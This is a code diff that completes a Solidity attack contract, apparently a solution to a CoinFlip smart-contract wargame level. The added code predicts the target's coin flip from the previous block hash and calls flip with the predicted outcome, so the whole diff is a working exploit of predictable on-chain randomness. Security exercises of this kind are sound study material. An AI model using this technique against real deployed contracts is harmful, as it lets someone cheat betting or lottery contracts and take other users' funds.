@@ -10,6 +10,12 @@ contract AttackingCoinFlip {
     }
 
     function hackContract() external {
-        // Code me!
+        CoinFlip coinFlip = CoinFlip(contractAddress);
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+        bool outcome = blockValue / factor == 1;
+
+        coinFlip.flip(outcome);
     }
 }
